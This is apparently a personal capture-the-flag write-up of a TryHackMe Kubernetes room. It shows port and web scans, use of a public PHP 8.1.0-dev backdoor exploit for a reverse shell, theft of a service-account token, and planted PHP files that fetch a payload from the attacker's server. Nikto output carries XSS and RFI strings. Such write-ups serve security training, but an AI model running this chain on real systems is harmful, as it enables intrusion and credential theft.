<h1 align="center">Frank and Herby try again.....</h1>
<p align="center">2025, October 5<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>517</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Frank and Herby still don't know how to use kubernetes correctly.</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/9d256bcb-9e93-4043-8e79-98383fb65246"><br>
Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/f5389d97-300c-458f-bddb-5cc64c37ad2c"></p>

<br>
<br>
<h1>Task 1 . You can do it!</h1>
<p>So Frank and Herb have become Kubernetes experts now and would never misconfigure their own deployment (agaun)!</p>

<p><em>Answer the questions below</em></p>


<br>
<br>
<h1 align="center">Summary</h1>
<p  align="center">
  
[Port Scanning → Service Discovery](#1)<br>[Web Vulberability Scanning](#2)<br>
[Directory and File Enumeration](#3)<br>
[Web Interface Inspection](#4)<br>
[Weaponization](#5)<br>
[Delivery and Execution](#6)<br>
[Initial Foothold](#7)<br>
[Privileged Access via Kubernetes Service Account & User Flag](#8)<br>
[Privilege Escalation & Root Flag](#9)</p>

<br>
<br>
<h1 align="center">Port Scanning → Service Discovery<a id='1'></a></h1>
<p align="center"><strong>8</strong> open ports</p>
<br>

```bash
:~/FrankandHerbyTryAgain# nmap -p- -sS -sV -sC -T4 -Pn --open xx.xxx.xx.xx -oN full_scan.txt
```

<div align="center"><h6>

| **Parameter**      | **Purpose**                                                                              |
|-------------------:|:-----------------------------------------------------------------------------------------|
| `-p-`              | scans all 65,535 TCP ports to ensure full coverage.                                      |
| `-sS` 	           | performs a TCP SYN scan, which is fast and stealthy—ideal for initial reconnaissance.    |
| `-sV` 	           | enables service version detection to identify software running on each port.             |
| `-sC` 	           | runs default scripts (e.g., , ) to gather additional service metadata.                   |
| `-T4` 	           | Uses aggressive timing to speed up the scan without sacrificing reliability.             |
| `-Pn` 	           | disables host discovery to avoid false negatives when ICMP ping is blocked.              |
| `--open`           | displays only open ports to reduce noise and focus on actionable results.                |
| `-oN full_scan.txt`| saves the output to a readable file for later analysis and documentation.                |

</h6></div><br>

```bash
:~/FrankandHerbyTryAgain# nmap -p- -sS -sV -sC -T4 -Pn --open xx.xxx.xx.xx -oN full_scan.txt
...
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=microk8s@1647797913
| Subject Alternative Name: DNS:microk8s
| Not valid before: 2022-03-20Txx:xx:xx
|_Not valid after:  2023-03-20Txx:xx:xx
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open  ssl/unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1759688813
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2025-10-05Txx:xx:xx
|_Not valid after:  2026-10-05Txx:xx:xx
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10259/tcp open  ssl/unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sun, 05 Oct 2025 18:35:46 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1759688800
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2025-10-05Txx:xx:xx
|_Not valid after:  2026-10-05Txx:xx:xx
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
16443/tcp open  ssl/unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 659c389e-6a4a-4843-830a-073c7e3f5d7f
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: cacb6992-aa85-40d1-a22a-4111b51ffcc4
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 02986f30-4747-4dfe-8d46-4156a859718b
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sun, 05 Oct 2025 xx:xx:xx GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:xx.xxx.xx.xx
| Not valid before: 2025-10-05Txx:xx:xx
|_Not valid after:  2026-10-05Txx:xx:xx
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
25000/tcp open  ssl/http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:xx.xxx.xx.xx
| Not valid before: 2025-10-05Txx:xx:xx
|_Not valid after:  2026-10-05Txx:xx:xx
30679/tcp open  http        PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title: FRANK RULEZZ!
```

<br>
<br>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     | **Certificate CN**             | **Evidences**                                                                                                                                             |
|-------------------:|:---------------------|:--------------------------------|:-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------------------------|
| `22`<br><br><br>   |`SSH`<br><br><br>     |OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |-<br><br><br>                   |Standard SSH banner confirms OpenSSH version.<br><br><br>                                                                                                  |
| `10250`<br><br><br>|`SSL/HTTP`<br><br><br>|Kubelet API<br><br><br>          |microk8s@1647797913<br><br><br> |Port 10250 is standard for Kubelet API. Golang net/http server and MicroK8s CN confirm node-level Kubernetes service.<br><br>                              |
| `10255`<br><br><br>|`HTTP`<br><br><br>    |Kubelet Read-Only API<br><br>    |-<br><br><br>                   |Port 10255 was used for Kubelet’s unauthenticated read-only endpoint. Golang net/http server matches legacy Kubelet behavior.                              |
| `10257`<br><br><br>|`SSL/HTTP`<br><br><br>|Kubernetes API server<br><br>    |localhost@1759612053<br><br><br>|JSON response with apiVersion:"v1" and RBAC denial. ALPN shows http/1.1 and h2. Matches Kubernetes API server behavior.<br><br>                            |
| `10259`<br><br><br>|`SSL/HTTP`<br><br><br>|Kubernetes API server<br><br>    |localhost@1759612058<br><br><br>|Identical response structure and RBAC error as 10257. Certificate CN differs, suggesting a separate instance of the same service.<br><br>                  |
| `16443`<br><br><br>|`SSL/HTTP`<br><br><br>|Kubernetes API server<br><br>    |127.0.0.1, Canonical, GB<br><br>|JSON response with apiVersion:"v1" and 401 Unauthorized. SANs include kubernetes.default.svc.cluster.local—definitive for Kubernetes control plane.        |
| `25000`<br><br><br>|`SSL/HTTP`<br><br><br>|Gunicorn 19.7.1<br><br><br>      |127.0.0.1, Canonical, GB<br><br>|HTTP header confirms Gunicorn 19.7.1. Certificate SANs include Kubernetes DNS entries, suggesting Kubernetes-related traffic.<br>                          |
| `30679`<br><br>    |`HTTP`<br><br>        |PHP CLI server<br><br>           |-<br><br>                       |HTTP banner confirms PHP CLI Server 5.5+ with version `PHP 8.1.0-dev`. Page title indicates custom `dev/test` page.                                        |

</p></div><br>

<br>
<br>
<h1 align="center">Web Vulberability Scanning<a id='2'></a></h1>
<p align="center"><code>25000</code> and <code>30679</code>code>are the only ports confirmed to be running HTTP services with banners or headers that Nikto can analyze effectively.<br>Other ports are likely Kubernetes or API endpoints that Nikto is not optimized to scan.</p>

<br>
<div align="center"><h6>

| **Discovery**                                               | **Details**                                                                                                                                  |
|------------------------------------------------------------:|:---------------------------------------------------------------------------------------------------------------------------------------------|
| `SSL Certificate Mismatch`<br><br>                          | - Hostname  does not match certificate CN <br>- May indicate misconfiguration or internal-only exposure.                                     |
| `Missing Anti-Clickjacking Header`<br><br>                  | - X-Frame-Options header is not present<br>- Could allow clickjacking attacks if the app has sensitive UI components.                        |
| `Gunicorn Server Detected`<br><br> 	                        | - erver identified as gunicorn/19.7.1<br>- Python-based WSGI server; may suggest Flask or Django backend.                                    |

</h6></div>  


```bash
:~/FrankandHerbyTryAgain# nikto -h https://xx.xxx.xx.xx:25000
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xx
+ Target Hostname:    xx.xxx.xx.xx
+ Target Port:        25000
---------------------------------------------------------------------------
...
---------------------------------------------------------------------------
+ Server: gunicorn/19.7.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Hostname 'xx.xxx.xx.xx' does not match certificate's CN '127.0.0.1'
+ 6544 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-10-05 xx:xx:xx (GMT1) (56 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<div align="center"><h6>

| **Discovery**                                               | **Details**                                                                                                                                  |
|------------------------------------------------------------:|:---------------------------------------------------------------------------------------------------------------------------------------------|
| `PHP Info Exposure`<br><br>                                 | - /info.php<br> - reveals full PHP configuration, including loaded modules, paths, and environment variables.                                |
| `Remote File Inclusion (RFI)`<br><br>                       | - /info.php?file=http://cirt.net/rfiinc.txt<br>- Suggests the server may process external file input, indicating possible RFI vulnerability. |
| `XSS` <br><br><br>                 	                        | - /phpimageview.php, /myphpnuke/links.php, /modules.php, /members.asp<br>- Reflected XSS via query parameters.                               |

</h6></div>  

```bash
:~/FrankandHerbyTryAgain# nikto -h http://xx.xxx.xx.xx:30679
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xx
+ Target Hostname:    xx.xxx.xx.xx
+ Target Port:        30679
+ Start Time:         2025-10-05 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: PHP/8.1.0-dev
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-27071: /phpimageview.php?pic=javascript:alert(8754): PHP Image View 1.0 is vulnerable to Cross Site Scripting (XSS).  http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-3931: /myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ /modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ /modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-4598: /members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-2946: /forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-18114: /reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF:  Oracle Reports rwservlet report Variable Arbitrary Report Executable Execution
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 6544 items checked: 24 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-10-05 xx:xx:xx (GMT1) (81 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<br>
<h1 align="center">Directory and File Enumeration<a id='3'></a></h1>
<p align="center">10255</p>

```bash
:~/FrankandHerbyTryAgain# gobuster dir -u http://xx.xxx.xx.xx:10255 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -b 400 --exclude-length 48,19
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://xx.xxx.xx.xx:10255
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
[+] Negative Status codes:   404
[+] Exclude Length:          48,19
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,js,json,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/stats                (Status: 301) [Size: 42] [--> /stats/]
/logs                 (Status: 301) [Size: 41] [--> /logs/]
/.                    (Status: 301) [Size: 36] [--> /]
/exec                 (Status: 301) [Size: 41] [--> /exec/]
/attach               (Status: 301) [Size: 43] [--> /attach/]
/run                  (Status: 301) [Size: 40] [--> /run/]
/metrics              (Status: 200) [Size: 2959434]
/pods                 (Status: 200) [Size: 32105]
Progress: 337758 / 337764 (100.00%)
===============================================================
Finished
===============================================================
```


```bash
:~/FrankandHerbyTryAgain# dirsearch -u https://xx.xxx.xx.xx:10250/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/FrankandHerbyTryAgain/reports/https_xx.xxx.xx.xx_10250/__25-10-05_xx-xx-xx.txt

Target: https://xx.xxx.xx.xx:10250/

[xx:xx:02] Starting: 
[xx:xx:03] 301 -   46B  - /%2e%2e//google.com  ->  /google.com
[xx:xx:03] 301 -   46B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[xx:xx:28] 401 -   12B  - /attach
[xx:xx:29] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
[xx:xx:29] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
[xx:xx:29] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
[xx:xx:32] 301 -   46B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[xx:xx:33] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[xx:xx:39] 301 -   48B  - /debug/pprof  ->  /debug/pprof/
[xx:xx:39] 401 -   12B  - /debug/pprof/
[xx:xx:39] 401 -   12B  - /debug/pprof/profile
[xx:xx:39] 401 -   12B  - /debug/pprof/goroutine?debug=1
[xx:xx:39] 401 -   12B  - /debug/pprof/heap
[xx:xx:39] 401 -   12B  - /debug/pprof/trace
[xx:xx:42] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
[xx:xx:42] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
[xx:xx:44] 401 -   12B  - /exec
[xx:xx:44] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
[xx:xx:48] 401 -   12B  - /healthz
[xx:xx:49] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
[xx:xx:58] 401 -   12B  - /logs/access_log
[xx:xx:58] 401 -   12B  - /logs/proxy_access_ssl_log
[xx:xx:58] 301 -   41B  - /logs  ->  /logs/
[xx:xx:58] 401 -   12B  - /logs/errors.log
[xx:xx:58] 401 -   12B  - /logs/error_log
[xx:xx:58] 401 -   12B  - /logs/liferay.log
[xx:xx:58] 401 -   12B  - /logs/www-error.log
[xx:xx:58] 401 -   12B  - /logs/access.log
[xx:xx:58] 401 -   12B  - /logs/mail.log
[xx:xx:58] 401 -   12B  - /logs/
[xx:xx:58] 401 -   12B  - /logs/wsadmin.traceout
[xx:xx:58] 401 -   12B  - /logs/error.log
[xx:xx:58] 401 -   12B  - /logs/proxy_error_log
[xx:xx:01] 401 -   12B  - /metrics
[xx:xx:13] 401 -   12B  - /pods
[xx:xx:19] 401 -   12B  - /run
[xx:xx:27] 301 -   42B  - /stats  ->  /stats/
[xx:xx:27] 401 -   12B  - /stats/

Task Completed
```

<br>
<br>
<h1 align="center">Web Interface Inspection<a id='4'></a></h1>
<p align="center">10250</p>

<img width="1226" height="187" alt="image" src="https://github.com/user-attachments/assets/8798172c-aa7f-48de-9b29-8e0e0271742c" />

<br>
<br>
<br>
<p align="center">10255</p>

<img width="1235" height="304" alt="image" src="https://github.com/user-attachments/assets/c19a830d-5956-4ac6-b215-e24d51d732d9" />

<br>
<br>
<br>
<p>  
  
- navigated to xx.xxx.xx.xx:10255/pods<br>
- identified /var/run/secrets/kubernetes.io/serviceaccount</p>

<img width="1136" height="103" alt="image" src="https://github.com/user-attachments/assets/7edd1cf0-1b61-4f5d-9fda-634c0c2b4367" />

<br>
<br>
<br>

<img width="1225" height="420" alt="image" src="https://github.com/user-attachments/assets/0b543189-b54c-40e8-869a-bbe632032a90" />

<br>
<br>
<br>

<img width="1133" height="527" alt="image" src="https://github.com/user-attachments/assets/9c3bcdd7-8879-4d46-b9ee-6f81f7c3b066" />

<br>
<br>
<br>
<p align="center">30679</p>

<img width="936" height="247" alt="image" src="https://github.com/user-attachments/assets/4f702bb7-0012-4c1e-b2f6-e48501897789" />

<br>
<br>
<br>
<h1 align="center">Weaponization<a id='5'></a></h1>


```bash
:~/FrankandHerbyTryAgain# searchsploit PHP 8.1.0
```

```bash
:~/FrankandHerbyTryAgain# searchsploit -m 49933.py
```

```bash
:~/FrankandHerbyTryAgain# python3 49933.py
Enter the full host url:
http://xx.xxx.xx.xx:30679/
```

```bash
$ id
uid=0(root) gid=0(root) groups=0(root)
```

<img width="1291" height="534" alt="image" src="https://github.com/user-attachments/assets/b2822499-c188-4a13-b86b-68d763d05c14" />


<p align="center">Downloaded  a repository</p>

```bash
:~/FrankandHerbyTryAgain# git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce
```

```bash
:~/FrankandHerbyTryAgain/php-8.1.0-dev-backdoor-rce# ls
backdoor_php_8.1.0-dev.py  docs  README.md  revshell_php_8.1.0-dev.py
```

<p align="center">Reverse Shell Listener Setup</p>

```bash
:~/FrankandHerbyTryAgain# nc -nlvp 9001
Listening on 0.0.0.0 9001
```

<p align="center">Exploit review</p>

```bash
python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <Attack_Port>
```

<br>
<br>
<h1 align="center">Delivery and Execution<a id='6'></a></h1>
<p align="center">Executed the exploit</p>

```bash
:~/FrankandHerbyTryAgain/php-8.1.0-dev-backdoor-rce# python3 revshell_php_8.1.0-dev.py http://xx.xxx.xx.xx:30679 xx.xxx.xx.xx 9001
```

<br>
<br>
<h1 align="center">Initial Foothold<a id='7'></a></h1>

```bash
:~/FrankandHerbyTryAgain# nc -nlvp 9001
...
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# 
```

<h1 align="center">Privileged Access via Kubernetes Service Account & User Flag<a id='8'></a></h1>

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ls -lah
ls -lah
total 16K
drwxrwxr-x 2 1000 1000 4.0K Mar 21  2022 .
drwxr-xr-x 3 root root 4.0K Mar 30  2021 ..
-rw-rw-r-- 1 1000 1000  640 Mar 21  2022 index.php
-rw-rw-r-- 1 1000 1000   20 Mar 21  2022 info.php
```

<br>

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# find / type -name *.io 2>/dev/null
<c:/var/www/html# find / type -name *.io 2>/dev/null
/run/secrets/kubernetes.io
```

```bash
root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io# ls
ls
serviceaccount
```

```bash
root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io# cd serviceaccount
```

```bash      
root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# ls
<fvtcg:/run/secrets/kubernetes.io/serviceaccount# ls                        
ca.crt
namespace
token
```

<br>

```bash    
root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat ca.crt
<un/secrets/kubernetes.io/serviceaccount# cat ca.crt                        
-----BEGIN CERTIFICATE-----
...
VQvJBsQMENSivG2/9sXsMK35O6ARZ4U0fgH+LJttXG9mMN+DLK7+Pna0mfNjlrc1
v+ystMEnq13M7jr7YTOfR1lFvg==
-----END CERTIFICATE-----
```

```bash   
:~/FrankandHerbyTryAgain# nano ca.crt
```

```bash   
:~/FrankandHerbyTryAgain# chmod 600 ca.crt
```

<br>

```bash      
root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat token
<run/secrets/kubernetes.io/serviceaccount# cat token                        
eyJhbG...
```

<br>

```bash   
:~/FrankandHerbyTryAgain# token='eyJhbG...'
```

<br>

```bash      
root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat namespace
```

<br>
<p align="center">With no access to microk8s, curl, or wget, I decided to uploade <strong>kubectl</strong>kubectl<br> in the target VM.<br>I spent considerable effort uploading itonly to realize later it wasn’t necessary.<br><br>Set up an HTTP server</p>

```bash
:~/FrankandHerbyTryAgain# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<br>
<p align="center">Downloaded <strong>kubectl</strong> to traget VM.<br>Crafted a File Upload Script <code>hi.php</code>.<br>Followed the guidance available  <a href="https://www.w3schools.com/php/php_file_upload.asp">here</a></p>p


```bash
:~/FrankandHerbyTryAgain# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   138  100   138    0     0   2760      0 --:--:-- --:--:-- --:--:--  2760
100 57.7M  100 57.7M    0     0   156M      0 --:--:-- --:--:-- --:--:--  156M
```

<br>
<p align="center">Created <strong>hi.php</strong> aiming to upload <strong>kubectl</strong> to the target.</p>

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# echo '<?php $target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) { echo "File is an image - " . $check["mime"] . ".";  $uploadOk = 1;  } else {  echo "File is not an image.";  $uploadOk = 0;  }}?>' > hi.php
```

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# exit
```

<br>
<p align="center">Navigated to <strong>xx.xxx.xx.xx:30679/hi.php</strong><br><strong>kubectl</strong> was successfully uploaded.</p>

```bash
:~/FrankandHerbyTryAgain# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xx - - [05/Oct/2025 xx:xx:xx] "GET /kubectl HTTP/1.1." 200 -
```

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# chmod +x kubectl
chmod +x kubectl
```

<br>
<p align="center">Since August, I’ve faced this challenge across many different days, each one demanding persistence and creativity. Discovering a simpler way to transfer files was a breakthrough, bu it´s just one step.<br><br>💙 I’m relying on that same strength to stay focused and keep building my career in information security!</p>

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# cat > /var/www/html/aa.php << 'EOF'
<g:/var/www/html# cat > /var/www/html/aa.php << 'EOF'
> <?php
<?php
> file_put_contents('backdoor.yaml', file_get_contents('http://xx.xxx.xx.xx:8000/backdoor.yaml'))
<ontents('http://xx.xxx.xx.xx:8000/backdoor.yaml'))
> ?>
?>
> EOF
EOF
```

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# exit
```

<br>
<p align="center">Navigated to <strong>xx.xxx.xx.xx:30679/aa.php</strong></p>


```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get pods -A                 
./kubectl get pods -A
NAMESPACE     NAME                                       READY   STATUS        RESTARTS      AGE
kube-system   calico-node-gnp7n                          1/1     Running       1 (91d ago)   91d
kube-system   calico-node-rpn2b                          1/1     Running       0             42m
kube-system   coredns-64c6478b6c-kj7d2                   1/1     Terminating   5 (91d ago)   3y200d
kube-system   calico-kube-controllers-664fd6f4fb-nj4q2   0/1     Terminating   1             91d
frankland     php-deploy-6d998f68b9-wlslz                1/1     Terminating   4 (91d ago)   3y199d
frankland     php-deploy-6d998f68b9-fvtcg                1/1     Running       0             37m
kube-system   coredns-64c6478b6c-x6wss                   1/1     Running       0             37m
kube-system   calico-kube-controllers-664fd6f4fb-5hlbd   1/1     Running       0             37m
```

<br>

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get secrets -A
./kubectl get secrets -A
NAMESPACE         NAME                                             TYPE                                  DATA   AGE
...
frankland         default-token-5fdt4                              kubernetes.io/service-account-token   3      3y200d
frankland         op-token-26qmx                                   kubernetes.io/service-account-token   3      3y200d
...
```

<br>
<p align="center">Identified <strong>path</strong>: <strong>/home/herby/app </strong></p>

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get pods frankland php-deploy-6d998f68b9-wlslz -o yaml
< pods frankland php-deploy-6d998f68b9-wlslz -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
...
    generateName: php-deploy-6d998f68b9-
    labels:
      app: php-deploy
      pod-template-hash: 6d998f68b9
    name: php-deploy-6d998f68b9-wlslz
    namespace: frankland
...
    - apiVersion: apps/v1
      blockOwnerDeletion: true
      controller: true
      kind: ReplicaSet
      name: php-deploy-6d998f68b9
...
  spec:
    containers:
    - image: vulhub/php:8.1-backdoor
      imagePullPolicy: IfNotPresent
      name: php-deploy
...
      volumeMounts:
      - mountPath: /var/www/html
        name: frank
